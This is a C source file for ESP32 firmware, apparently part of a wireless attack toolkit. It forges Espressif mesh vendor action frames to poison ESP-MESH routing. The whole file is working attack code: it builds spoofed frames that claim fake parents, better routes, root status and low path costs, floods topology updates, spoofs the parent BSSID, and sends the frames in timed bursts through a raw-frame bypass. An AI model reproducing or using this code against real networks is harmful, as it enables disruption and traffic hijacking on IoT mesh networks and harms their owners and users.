/**
 * mesh_route_poison.c
 *
 * Injects forged Espressif mesh vendor action frames that advertise fake
 * parents, routes, root claims, and low path costs to poison mesh routing.
 * Soft-AP pauses during attack; auto-stops after MESH_ROUTE_POISON_TIMEOUT_SEC.
 */

#include "mesh_route_poison.h"

#include <string.h>
#include <stdio.h>

#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "MESH_ROUTE_POISON";

/* Vendor mesh action subtypes used for poison payloads */
#define MESH_POISON_CMD_FAKE_PARENT  0x10
#define MESH_POISON_CMD_ROUTE_ADV    0x11
#define MESH_POISON_CMD_ROOT_CLAIM   0x12
#define MESH_POISON_CMD_COST_POISON  0x13
#define MESH_POISON_CMD_TOPOLOGY     0x14

static const char *mode_strings[] = {
    [MESH_ROUTE_POISON_MODE_NONE]        = "Idle",
    [MESH_ROUTE_POISON_MODE_FAKE_PARENT] = "Fake Parent",
    [MESH_ROUTE_POISON_MODE_ROUTE_ADV]   = "Route Advertise",
    [MESH_ROUTE_POISON_MODE_ROOT_CLAIM]  = "Root Claim",
    [MESH_ROUTE_POISON_MODE_COST_POISON] = "Cost Poison",
    [MESH_ROUTE_POISON_MODE_TOPOLOGY]    = "Topology Flood",
    [MESH_ROUTE_POISON_MODE_COMBINE]     = "Combine All",
};

static mesh_route_poison_state_t  s_state;
static mesh_route_poison_config_t s_cfg;
static volatile bool              s_running = false;
static TaskHandle_t               s_task = NULL;
static esp_timer_handle_t         s_timeout_timer = NULL;
static SemaphoreHandle_t          s_mutex = NULL;
static bool                       s_ap_was_stopped = false;

const char *mesh_route_poison_mode_str(mesh_route_poison_mode_t m)
{
    if (m >= MESH_ROUTE_POISON_MODE_COUNT) return "Unknown";
    return mode_strings[m];
}

static bool mutex_take(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
        if (s_mutex == NULL) return false;
    }
    return xSemaphoreTake(s_mutex, pdMS_TO_TICKS(2000)) == pdTRUE;
}

static void mutex_give(void)
{
    if (s_mutex != NULL) {
        xSemaphoreGive(s_mutex);
    }
}

/**
 * Build Espressif vendor mesh action frame with route-poison payload:
 *   [802.11 hdr 24] [seq 2] [cat=127] [0x00] [OUI E0:9A:F6] [cmd]
 *   [next_hop 6] [dest 6] [hop] [cost_lo] [cost_hi] [flags]
 */
static uint16_t build_poison_frame(uint8_t *out, size_t max_len,
                                   const uint8_t *dest, const uint8_t *src,
                                   const uint8_t *bssid, uint8_t cmd,
                                   const uint8_t *next_hop, const uint8_t *route_dest,
                                   uint8_t hop, uint16_t cost, uint8_t flags)
{
    const uint16_t total = 48;
    if (max_len < total) return 0;

    memset(out, 0, total);
    out[0] = 0xD0; /* Action */
    out[1] = 0x00;
    memcpy(out + 4,  dest,  6);
    memcpy(out + 10, src,   6);
    memcpy(out + 16, bssid, 6);
    out[24] = 0x00;
    out[25] = 0x00;
    out[26] = 127; /* vendor specific */
    out[27] = 0x00;
    out[28] = 0xE0;
    out[29] = 0x9A;
    out[30] = 0xF6; /* Espressif OUI */
    out[31] = cmd;

    memcpy(out + 32, next_hop, 6);
    memcpy(out + 38, route_dest, 6);
    out[44] = hop;
    out[45] = (uint8_t)(cost & 0xFF);
    out[46] = (uint8_t)((cost >> 8) & 0xFF);
    out[47] = flags;
    return total;
}

static bool send_frame(const uint8_t *frame, uint16_t len)
{
    return wsl_bypasser_send_raw_frame(frame, len);
}

static uint8_t resolve_tx_channel(uint8_t requested)
{
    if (requested > 0) return requested;
#ifndef CONFIG_MGMT_AP_CHANNEL
#define CONFIG_MGMT_AP_CHANNEL 6
#endif
    return CONFIG_MGMT_AP_CHANNEL;
}

static bool prepare_radio(uint8_t channel)
{
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    s_ap_was_stopped = false;
    wifi_mode_t mode = WIFI_MODE_NULL;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_APSTA) {
        wifictl_mgmt_ap_stop();
        s_ap_was_stopped = true;
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_err_t ch_err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (ch_err != ESP_OK) {
        ESP_LOGW(TAG, "Channel set to %u failed: %s", channel, esp_err_to_name(ch_err));
    }
    return true;
}

static void restore_radio(void)
{
    if (s_ap_was_stopped) {
        wifictl_mgmt_ap_start();
        s_ap_was_stopped = false;
    }
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
}

static void timeout_cb(void *arg)
{
    (void)arg;
    ESP_LOGW(TAG, "Route poison timeout (%d s)", MESH_ROUTE_POISON_TIMEOUT_SEC);
    if (mutex_take()) {
        s_state.timeout = true;
        mutex_give();
    }
    mesh_route_poison_stop();
}

static void start_timeout_timer(void)
{
    if (s_timeout_timer != NULL) {
        esp_timer_stop(s_timeout_timer);
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
    const esp_timer_create_args_t args = {
        .callback = timeout_cb,
        .name     = "mesh_rtpoison_to",
    };
    if (esp_timer_create(&args, &s_timeout_timer) == ESP_OK) {
        esp_timer_start_once(s_timeout_timer, MESH_ROUTE_POISON_TIMEOUT_US);
    }
}

static void stop_timeout_timer(void)
{
    if (s_timeout_timer != NULL) {
        esp_timer_stop(s_timeout_timer);
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
}

static void count_cmd(uint8_t cmd)
{
    switch (cmd) {
        case MESH_POISON_CMD_FAKE_PARENT: s_state.fake_parent_sent++; break;
        case MESH_POISON_CMD_ROUTE_ADV:   s_state.route_adv_sent++;   break;
        case MESH_POISON_CMD_ROOT_CLAIM:  s_state.root_claim_sent++;  break;
        case MESH_POISON_CMD_COST_POISON: s_state.cost_poison_sent++; break;
        case MESH_POISON_CMD_TOPOLOGY:    s_state.topology_sent++;    break;
        default: break;
    }
}

static void tx_one(uint8_t cmd, const uint8_t *dest, const uint8_t *src,
                   const uint8_t *bssid, const uint8_t *next_hop,
                   const uint8_t *route_dest, uint8_t flags)
{
    uint8_t frame[64];
    uint16_t len = build_poison_frame(frame, sizeof(frame),
                                      dest, src, bssid, cmd,
                                      next_hop, route_dest,
                                      s_cfg.hop_count, s_cfg.path_cost, flags);
    if (len == 0) {
        snprintf(s_state.error, sizeof(s_state.error), "Frame build failed");
        return;
    }

    if (send_frame(frame, len)) {
        s_state.packets_sent++;
        count_cmd(cmd);
    } else {
        s_state.packets_failed++;
    }
}

static uint8_t cmd_for_mode(mesh_route_poison_mode_t mode, uint32_t tick)
{
    static const uint8_t combine_cmds[] = {
        MESH_POISON_CMD_FAKE_PARENT,
        MESH_POISON_CMD_ROUTE_ADV,
        MESH_POISON_CMD_ROOT_CLAIM,
        MESH_POISON_CMD_COST_POISON,
        MESH_POISON_CMD_TOPOLOGY,
    };

    switch (mode) {
        case MESH_ROUTE_POISON_MODE_FAKE_PARENT: return MESH_POISON_CMD_FAKE_PARENT;
        case MESH_ROUTE_POISON_MODE_ROUTE_ADV:   return MESH_POISON_CMD_ROUTE_ADV;
        case MESH_ROUTE_POISON_MODE_ROOT_CLAIM:  return MESH_POISON_CMD_ROOT_CLAIM;
        case MESH_ROUTE_POISON_MODE_COST_POISON: return MESH_POISON_CMD_COST_POISON;
        case MESH_ROUTE_POISON_MODE_TOPOLOGY:    return MESH_POISON_CMD_TOPOLOGY;
        case MESH_ROUTE_POISON_MODE_COMBINE:
            return combine_cmds[tick % (sizeof(combine_cmds) / sizeof(combine_cmds[0]))];
        default:
            return MESH_POISON_CMD_ROUTE_ADV;
    }
}

static void tx_burst(uint32_t tick)
{
    const uint8_t *parent   = s_cfg.parent_bssid;
    const uint8_t *next_hop = s_cfg.fake_next_hop_set ? s_cfg.fake_next_hop : parent;
    uint8_t bcast[6];
    memset(bcast, 0xFF, 6);

    const uint8_t *dest = s_cfg.target_mac_set ? s_cfg.target_mac : bcast;
    const uint8_t *route_dest = dest;

    uint16_t burst = s_cfg.burst_size;
    if (burst == 0) burst = 1;
    if (burst > 32) burst = 32;

    for (uint16_t b = 0; b < burst && s_running; b++) {
        uint8_t cmd = cmd_for_mode(s_cfg.mode, tick + b);
        uint8_t flags = 0;

        switch (cmd) {
            case MESH_POISON_CMD_FAKE_PARENT:
                /* Prefer-parent flag; source = spoofed next hop claiming parenthood */
                flags = 0x01;
                tx_one(cmd, dest, next_hop, parent, next_hop, route_dest, flags);
                break;

            case MESH_POISON_CMD_ROUTE_ADV:
                /* Advertise next_hop as best path to route_dest */
                flags = 0x02;
                tx_one(cmd, dest, next_hop, parent, next_hop, route_dest, flags);
                break;

            case MESH_POISON_CMD_ROOT_CLAIM:
                /* Broadcast root claim from next_hop */
                flags = 0x04;
                tx_one(cmd, bcast, next_hop, parent, next_hop, parent, flags);
                break;

            case MESH_POISON_CMD_COST_POISON:
                /* Low-cost path advertisement toward victim */
                flags = 0x08;
                tx_one(cmd, dest, next_hop, parent, next_hop, route_dest, flags);
                break;

            case MESH_POISON_CMD_TOPOLOGY:
                /* Topology update flood */
                flags = 0x10;
                tx_one(cmd, bcast, next_hop, parent, next_hop, route_dest, flags);
                break;

            default:
                break;
        }
    }
}

static void poison_task(void *arg)
{
    (void)arg;

    ESP_LOGW(TAG, "═══ MESH ROUTE POISON START ═══ mode=%s ch=%u hop=%u cost=%u",
             mesh_route_poison_mode_str(s_cfg.mode),
             s_cfg.channel, s_cfg.hop_count, s_cfg.path_cost);

    uint8_t tx_channel = resolve_tx_channel(s_cfg.channel);
    s_cfg.channel = tx_channel;
    s_state.channel = tx_channel;
    prepare_radio(tx_channel);

    uint32_t start_us = (uint32_t)esp_timer_get_time();
    uint32_t tick = 0;

    while (s_running) {
        tx_burst(tick);
        tick++;
        s_state.uptime_ms = (uint32_t)((esp_timer_get_time() - start_us) / 1000);

        if (s_cfg.interval_ms > 0) {
            vTaskDelay(pdMS_TO_TICKS(s_cfg.interval_ms));
        } else {
            taskYIELD();
        }
    }

    ESP_LOGI(TAG, "Route poison done: sent=%lu failed=%lu parent=%lu route=%lu root=%lu cost=%lu topo=%lu",
             (unsigned long)s_state.packets_sent,
             (unsigned long)s_state.packets_failed,
             (unsigned long)s_state.fake_parent_sent,
             (unsigned long)s_state.route_adv_sent,
             (unsigned long)s_state.root_claim_sent,
             (unsigned long)s_state.cost_poison_sent,
             (unsigned long)s_state.topology_sent);

    stop_timeout_timer();
    restore_radio();
    s_state.active = false;
    s_running = false;
    s_task = NULL;
    vTaskDelete(NULL);
}

void mesh_route_poison_init(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
    }
    memset(&s_state, 0, sizeof(s_state));
    s_running = false;
    ESP_LOGI(TAG, "Mesh route poison ready (%d modes)",
             (int)MESH_ROUTE_POISON_MODE_COUNT - 1);
}

esp_err_t mesh_route_poison_start(const mesh_route_poison_config_t *cfg)
{
    if (!cfg) return ESP_ERR_INVALID_ARG;
    if (s_running) return ESP_ERR_INVALID_STATE;

    uint8_t zero[6] = {0};
    if (memcmp(cfg->parent_bssid, zero, 6) == 0) {
        return ESP_ERR_INVALID_ARG;
    }
    if (cfg->mode <= MESH_ROUTE_POISON_MODE_NONE ||
        cfg->mode >= MESH_ROUTE_POISON_MODE_COUNT) {
        return ESP_ERR_INVALID_ARG;
    }

    memset(&s_state, 0, sizeof(s_state));
    memcpy(&s_cfg, cfg, sizeof(s_cfg));

    if (!s_cfg.target_mac_set) {
        memset(s_cfg.target_mac, 0xFF, 6);
    }
    if (!s_cfg.fake_next_hop_set) {
        /* Default: spoof as parent BSSID claiming better routes */
        memcpy(s_cfg.fake_next_hop, s_cfg.parent_bssid, 6);
        s_cfg.fake_next_hop_set = true;
    }
    if (s_cfg.burst_size == 0) {
        s_cfg.burst_size = 5;
    }
    if (s_cfg.interval_ms == 0) {
        s_cfg.interval_ms = 50;
    }
    if (s_cfg.hop_count == 0) {
        s_cfg.hop_count = 1;
    }

    s_state.active = true;
    s_state.mode = s_cfg.mode;
    s_state.channel = s_cfg.channel;
    s_state.hop_count = s_cfg.hop_count;
    s_state.path_cost = s_cfg.path_cost;
    memcpy(s_state.parent_bssid, s_cfg.parent_bssid, 6);
    memcpy(s_state.target_mac, s_cfg.target_mac, 6);
    memcpy(s_state.fake_next_hop, s_cfg.fake_next_hop, 6);
    strncpy(s_state.ssid, s_cfg.ssid, sizeof(s_state.ssid) - 1);
    strncpy(s_state.mode_str, mesh_route_poison_mode_str(s_cfg.mode),
            sizeof(s_state.mode_str) - 1);

    s_running = true;
    start_timeout_timer();

    if (xTaskCreate(poison_task, "mesh_rtpoison", 6144, NULL, 2, &s_task) != pdPASS) {
        s_running = false;
        s_state.active = false;
        stop_timeout_timer();
        return ESP_ERR_NO_MEM;
    }

    return ESP_OK;
}

esp_err_t mesh_route_poison_stop(void)
{
    if (!s_running && !s_state.active) {
        restore_radio();
        return ESP_OK;
    }

    s_running = false;
    stop_timeout_timer();

    int wait = 30;
    while (s_task && wait-- > 0) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (s_task) {
        vTaskDelete(s_task);
        s_task = NULL;
    }

    restore_radio();
    s_state.active = false;
    return ESP_OK;
}

bool mesh_route_poison_is_active(void)
{
    return s_running || s_state.active;
}

const mesh_route_poison_state_t *mesh_route_poison_get_state(void)
{
    return &s_state;
}

cJSON *mesh_route_poison_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    const mesh_route_poison_state_t *st = &s_state;

    cJSON_AddBoolToObject(root, "active", st->active || s_running);
    cJSON_AddBoolToObject(root, "timeout", st->timeout);
    cJSON_AddNumberToObject(root, "mode", st->mode);
    cJSON_AddStringToObject(root, "mode_str",
        st->mode_str[0] ? st->mode_str : mesh_route_poison_mode_str(st->mode));
    cJSON_AddNumberToObject(root, "packets_sent", st->packets_sent);
    cJSON_AddNumberToObject(root, "packets_failed", st->packets_failed);
    cJSON_AddNumberToObject(root, "fake_parent_sent", st->fake_parent_sent);
    cJSON_AddNumberToObject(root, "route_adv_sent", st->route_adv_sent);
    cJSON_AddNumberToObject(root, "root_claim_sent", st->root_claim_sent);
    cJSON_AddNumberToObject(root, "cost_poison_sent", st->cost_poison_sent);
    cJSON_AddNumberToObject(root, "topology_sent", st->topology_sent);
    cJSON_AddNumberToObject(root, "uptime_ms", st->uptime_ms);
    cJSON_AddNumberToObject(root, "channel", st->channel);
    cJSON_AddNumberToObject(root, "hop_count", st->hop_count);
    cJSON_AddNumberToObject(root, "path_cost", st->path_cost);
    cJSON_AddStringToObject(root, "ssid", st->ssid);

    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             st->parent_bssid[0], st->parent_bssid[1], st->parent_bssid[2],
             st->parent_bssid[3], st->parent_bssid[4], st->parent_bssid[5]);
    cJSON_AddStringToObject(root, "parent_bssid", mac);

    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             st->target_mac[0], st->target_mac[1], st->target_mac[2],
             st->target_mac[3], st->target_mac[4], st->target_mac[5]);
    cJSON_AddStringToObject(root, "target_mac", mac);

    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             st->fake_next_hop[0], st->fake_next_hop[1], st->fake_next_hop[2],
             st->fake_next_hop[3], st->fake_next_hop[4], st->fake_next_hop[5]);
    cJSON_AddStringToObject(root, "fake_next_hop", mac);

    if (st->error[0]) {
        cJSON_AddStringToObject(root, "error", st->error);
    }

    cJSON_AddStringToObject(root, "status",
        (st->active || s_running) ? "Poisoning" :
        (st->timeout ? "Timeout" : "Idle"));

    return root;
}
